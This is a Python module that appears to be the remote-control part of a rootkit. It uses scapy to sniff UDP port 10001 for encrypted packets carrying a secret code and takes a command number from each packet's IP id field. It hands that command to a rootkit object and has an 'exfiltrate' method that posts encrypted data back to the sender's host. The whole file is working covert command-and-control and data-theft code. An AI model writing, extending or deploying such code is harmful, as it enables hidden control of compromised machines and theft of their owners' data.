import socket

import requests
from scapy.all import *
import webbrowser

from scapy.layers.inet import IP

import encryption
port = "10001"


class remote_receiver:
    def __init__(self, cd, key, rkit):
        self.rkit = rkit
        self.code = cd
        self.key = key
        conf.use_pcap = True
        self.encrypter = encryption.encryption(key)
        self.host = ''

    def exfiltrate(self, data, opt):
        try:
            requests.post("http://" + self.host, data=self.encrypter.encrypt(opt) + b'\t' + self.encrypter.encrypt(data))
        except requests.RequestException:
            return "Receiver not found"

    def listen_loop(self):
        sniff(filter="udp and port "+port, prn=self.packet_handler)

    def packet_handler(self, captured_packet):
        encrypted_data = captured_packet['UDP'].payload
        try:
            decrypted_data = str(self.encrypter.decrypt(bytes(encrypted_data)))
        except TypeError:
            return
        if self.code not in decrypted_data:
            # print("code not found")
            return
        payload_id = captured_packet['IP'].id
        command = payload_id % 10
        self.host = captured_packet[IP].src
        data_i = decrypted_data.index(":")
        data = decrypted_data[data_i + 1:len(decrypted_data)-1]
        self.rkit.action_parse(command, data)
